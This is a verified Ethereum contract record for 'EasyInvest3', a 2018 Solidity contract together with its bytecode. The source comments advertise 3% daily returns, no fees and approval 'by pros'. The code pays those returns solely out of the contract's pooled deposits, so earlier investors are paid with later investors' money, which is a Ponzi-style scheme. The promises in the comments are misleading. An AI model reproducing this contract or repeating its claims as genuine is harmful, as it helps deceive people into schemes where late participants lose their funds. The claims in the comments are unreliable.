{
  "address": "0x02c60d28be3338014fef3fdf50a3218b946c0609",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "EasyInvest3",
  "compilerVersion": "v0.4.24+commit.e67f0147",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2018-10-01\n*/\n\npragma solidity ^0.4.24;\n\n/**\n *\n * Easy Investment3 Contract\n *  - GAIN 3% PER 24 HOURS (every 5900 blocks)\n *  - NO COMMISSION on your investment (every ether stays on contract's balance)\n *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\n *\n * How to use:\n *  1. Send any amount of ether to make an investment\n *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\n *  OR\n *  2b. Send more ether to reinvest AND get your profit at the same time\n *\n * RECOMMENDED GAS LIMIT: 70000\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\n *\n * Contract reviewed and approved by pros!\n *\n */\ncontract EasyInvest3 {\n    // records amounts invested\n    mapping (address => uint256) public invested;\n    // records blocks at which investments were made\n    mapping (address => uint256) public atBlock;\n\n    // this function called every time anyone sends a transaction to this contract\n    function () external payable {\n        // if sender (aka YOU) is invested more than 0 ether\n        if (invested[msg.sender] != 0) {\n            // calculate profit amount as such:\n            // amount = (amount invested) * 3% * (blocks since last transaction) / 5900\n            // 5900 is an average block count per day produced by Ethereum blockchain\n            uint256 amount = invested[msg.sender] * 3 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n\n            // send calculated amount of ether directly to sender (aka YOU)\n            msg.sender.transfer(amount);\n        }\n\n        // record block number and invested amount (msg.value) of this transaction\n        atBlock[msg.sender] = block.number;\n        invested[msg.sender] += msg.value;\n    }\n}",
  "bytecode": "608060405234801561001057600080fd5b506101a9806100206000396000f30060806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166366b3f6bf81146100eb5780638aac13621461012b575b33600090815260208190526040812054156100c75733600090815260016020908152604080832054918390529091205461170c91430390606490600302040281151561009357fe5b6040519190049150339082156108fc029083906000818181858888f193505050501580156100c5573d6000803e3d6000fd5b505b50336000908152600160209081526040808320439055908290529020805434019055005b3480156100f757600080fd5b5061011973ffffffffffffffffffffffffffffffffffffffff60043516610159565b60408051918252519081900360200190f35b34801561013757600080fd5b5061011973ffffffffffffffffffffffffffffffffffffffff6004351661016b565b60006020819052908152604090205481565b600160205260009081526040902054815600a165627a7a72305820d1f10da526dea08e2634a170978a3563ddf2bcacc027e407eee4da6c332f12ce0029"
}